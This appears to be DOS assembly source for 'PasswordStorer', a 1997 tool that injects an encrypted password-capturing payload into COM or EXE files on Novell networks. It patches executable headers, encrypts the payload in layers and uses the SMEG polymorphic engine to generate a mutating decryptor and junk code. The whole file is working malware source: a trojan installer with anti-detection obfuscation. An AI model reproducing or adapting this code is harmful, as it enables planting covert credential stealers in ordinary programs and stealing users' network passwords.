lendrop         =       812+18h
fname		=	4
dropmask	=	321h
lendrop2nd	=	2f3h

model tiny
.code

extrn	smeg:near		;генератор smeg
extrn	encrypt:near		;процедура криптовки
extrn	smeg_bottom:near	;начало smeg
extrn	smeg_top:near		;конец smeg
extrn	generate_garbage:near	;генератор мусора

.startup
		call	$+3
		pop	si
		add	si,offsubmove-3
		mov	di,sp
		sub	di,800h
		mov	cx,lenmove
		push	di
		cld
		rep	movsb
		retn
offsubmove	equ	$-@startup
submove:	sub	si,offrun
		mov	di,100h
		lea	cx,smeg_top+lendrop-100h
		rep	movsb
		lea	ax,normalrun
		push	ax
		retn
lenmove		equ	$-submove
offrun		equ	$-@startup
normalrun:	cmp	si,di
		je	secondcrypt
		mov	ah,34h
		int	21h
		mov	di,es:[bx+0fh]
		mov	ah,51h
		int	21h
		mov	ds,di
		mov	es,bx
		sub	di,bx
		mov	ax,es:[di+16h]
		mov	es,ax
		sub	ax,es:[di+16h]
		xchg	si,ax
		lodsw
		lea	si,secondcrypt[di]
		mov	cx,offset smeg_top+lendrop-lensecond-100h
wordxor:	add	ax,0
secondmask	=	word ptr $-2
		xor	[si],al
		rol	ax,1
		inc	si
		loop	wordxor
lensecond	equ	$-@startup
secondcrypt:	push	cs
		pop	es
		lea	dx,copyright
		call	print
		lea	dx,myself24h
		mov	ax,2524h
		int	21h
		call	selfmutation
		mov	di,81h
		mov	cl,[di-1]
		xor	ch,ch
		jcxz	gethelp
		lea	bx,filename
		call	storefile
		mov	bp,di
		mov	di,si
		lea	bx,filelist
		lea	dx,continue
		push	dx
storefile:	pop	dx
		mov	al,' '
		repe	scasb
		jcxz	gethelp
		inc	cx
		lea	si,[di-1]
		mov	di,bx
nextchar:	lodsb
		cmp	al,' '
		jbe	endchar
		stosb
		loop	nextchar
endchar:	jmp	dx

gethelp:	lea	dx,helpme
print:		call	strprint
		lea	dx,crlf
strprint:	mov	ah,9
		int	21h
		retn

continue:	mov	di,bp
		mov	ax,' '
		stosw
		mov	ax,'--'
		stosw
		mov	ax,'$ '
		stosw
		lea	dx,installfile
		call	strprint
		mov	[bp],ch
		lea	si,filelist
		lea	di,smeg_top+fname
		mov	ah,60h
		int	21h
		lea	dx,nopath
		jc	closeshort
		lea	dx,filename
		mov	ax,3d02h
		int	21h
		jc	printshort
		xchg	bx,ax
		lea	dx,smeg_top+lendrop-18h
		mov	cl,18h
		mov	ah,3Fh
		int	21h
printshort:	jc	printerror
		mov	si,dx
		lea	di,header
		push	di
		rep	movsb
		pop	si
		sub	ax,18h
closeshort:	jc	printerror
		lodsw
		not	ax
		mul	ah
		cmp	ax,72bah
		pushf
		mov	al,2
		call	lseek
		popf
		jne	itcom
		call	makeheader
		jmp	commoncode
itcom:		and	dx,dx
		jnz	printerror
		cmp	ax,-(lendrop+1000h)
		ja	printerror
		inc	ah
		push	ax		;смещение выполнения декриптора
		sub	ax,103h
		mov	byte ptr [si-2],0e9h
		mov	[si-1],ax
		pop	ax
		call	cryptmain
commoncode:	jc	printerror
		xor	al,al
		call	lseek
		lea	dx,[si-2]
		mov	cl,18h
		mov	ah,40h
		int	21h
		lea	dx,install
		jnc	close
printerror:	lea	dx,error
close:		mov	ah,3eh
		int	21h
		jmp	print

makeheader:	cmp	dx,10h
		jae	badsize
		xchg	bp,ax
		mov	di,dx
		mov	ax,[si+4-2]
		cmp	cx,[si+2-2]
		je	zerolastpage
		dec	ax
zerolastpage:	mov	dx,200h
		mul	dx
		add	ax,[si+2-2]
		cmp	dx,di
		jne	badsize
		cmp	ax,bp
		je	oksize
badsize:	stc
		retn
oksize:		push	dx ax
		mov	cl,10h
		div	cx
		sub	ax,[si+8-2]
		mov	[si+16h-2],ax
		mov	[si+14h-2],dx
		mov	[si+0eh-2],ax
		xchg	dx,ax		;смещение выполнения декриптора
		call	cryptmain
		pop	ax dx
		jc	badsize
		mov	di,[bp.datasize]
		add	di,[bp.decryptor_size]
		add	cx,di
		add	di,1024
		mov	[si+10h-2],di
		add	ax,cx
		adc	dx,0
		mov	cx,200h
		div	cx
		and	dx,dx
		jz	itzerolast
		inc	ax
itzerolast:	mov	[si+4-2],ax
		mov	[si+2-2],dx
		retn

lseek:		xor	cx,cx
		mov	ah,42h
		cwd
		int	21h
		retn

myself24h:	mov	al,3
		iret

cryptmain:	lea	di,smeg_top+3	;начало кода для первой криптовки
		push	ax
		xor	ah,ah
		int	1Ah
		mov	cx,lendrop2nd	;длина для первой криптовки
		mov	word ptr [di+dropmask-3],dx
		mov	ax,20cdh
crypt2nd:	sub	ax,dx
		xor	[di],al
		ror	ax,1
		inc	di
		loop	crypt2nd
		pop	ax
		lea	dx,smeg_top	;код для зашифровки
		mov	cx,lendrop	;длина шифруемого кода
		lea	bp,smeg_top+lendrop ;адрес для workbuffer
commoncrypt:	lea	di,[bp+2dh]	;рабочая область (2dh-длинa workbuffer'a)
		push	di
		call	smeg
		pop	dx
		mov	cx,[bp.decryptor_size]
		call	write		;пишем декриптор
                jc	exitcrypt
		call    encrypt		;шифруем код
		lea	dx,[bp+2dh]
		mov	cx,[bp.datasize]
		call	write		;пишем зашифрованный код
		jc	exitcrypt
		call	generate_garbage
write:		mov	ah,40h
		int	21h		;пишем в конец мусор
		jc	exitcrypt
		sub	ax,cx
exitcrypt:	retn

selfmutation:	xor	dl,dl
		mov	ax,3302h
		int	21h
		push	dx
		xor	ah,ah
		int	1Ah
		xchg	dx,ax
		mov	di,1
		and	ax,di
		jnz	exitmut
		mov	cx,[di+2ch-1]
		jcxz	exitmut
		mov	es,cx
nextfind:	dec	di
		scasw
		jnz	nextfind
		scasw
		push	es
		pop	ds
		mov	dx,di
		xchg	cx,ax
		mov	ax,4301h
		int	21h
		jc	exitmutdata
		mov	ax,3d01h
		int	21h
exitmutdata:	push	cs cs
		pop	es ds
		jc	exitmut
		xchg	bx,ax
		mov	ah,40h
		int	21h
		jc	cloself
		xor	ah,ah
		int	1Ah
		mov	secondmask,dx
		lea	si,@startup
		lea	di,smeg_top+lendrop
		lea	cx,[di-100h]
		push	si cx di
		rep	movsb
		mov	bp,di
		lea	di,smeg_top+lendrop+lensecond
		mov	cx,offset smeg_top+lendrop-lensecond-100h
		mov	ax,20cdh
xorbyte:	add	ax,dx
		xor	[di],al
		rol	ax,1
		inc	di
		loop	xorbyte
		pop	dx cx ax
		call	commoncrypt
cloself:	mov	ah,3eh
		int	21h
exitmut:	pop	dx
		mov	ax,3301h
		int	21h
		retn

copyright	db	0ah,'PasswordStorer 4 Novell Network / v2.02 (c) 1997 by Psychomancer aka Nice,SPS.'
crlf		db	0dh,0ah,'$'
helpme		db	'Usage: PswStor philename pswlist',0dh,0ah
		db	'where:',0dh,0ah
		db	'philename - storer installation phile (COM/EXE);',0dh,0ah
		db	'pswlist - password storing phile.',0dh,0ah,0ah
		db	'Example: PswStor ts.com -- in2 TS.COM will b include storer.',0dh,0ah
		db	'Pls c phile PswStor.doc 4 full information.',0dh,0ah,0ah
		db	'Special thanx 2 Black Baron 4 SMEG v0.3.',0dh,0ah
		db	'Send ur messages 2 me on: 2:454/5.9@FidoNet.$'
error		db	7,'unpossible storer installation.$'
nopath		db	7,'unknown path 4 storing phile.$'
install		db	'storer installed ok.$'
installfile	db	'Installation storer 2 phile: '
filename	db	86h dup (0)
filelist	db	81h dup (0)
header		db	18h dup (0)

workbuffer	struc
datasize	dw	?	; 00 length of data to crypt
sourceptr	dw	?	; 02 pointer to data to crypt
targetptr	dw	?	; 04 pointer of where to put crypted data
		db	?	; 06 reg0 encryption value
		db	?	; 07 reg1 counter register
		db	?	; 08 reg2 temporary storage for data
				;	  to be decrypted
		db	?	; 09 reg3
		db	?	; 0A reg4 (always BP)
		db	?	; 0B reg5
		db	?	; 0C reg6
		db	?	; 0D reg7 pointer register
rng_buffer	dw	?	; 0E used by random number generator
cryptval	db	?	; 10 encryption value
ptr_offsets	dw	?	; 11 XXXX in [bx+XXXX] memory references
loop_top	dw	?	; 13 points to top of decryption loop
pointer_patch	dw	?	; 15 points to initialisation of pointer
counter_patch	dw	?	; 17 points to initialisation of counter
pointer_fixup	dw	?	; 19 needed for pointer calculation
crypt_type	db	?	; 1B how is it encrypted?
initialIP	dw	?	; 1C IP at start of decryptor
lastgarble	db	?	; 1E type of the last garbling instr
cJMP_patch	dw	?	; 1F conditional jmp patch
CALL_patch	dw	?	; 21 CALL patch
nJMP_patch	dw	?	; 23 near JMP patch
garbage_size	dw	?	; 25 # garbage bytes to append
decryptor_size	dw	?	; 27 size of decryptor
last_CALL	dw	?       ; 29 location of an old CALL patch location
which_tbl	dw	?	; 2B which table to use
workbuffer	ends

		end
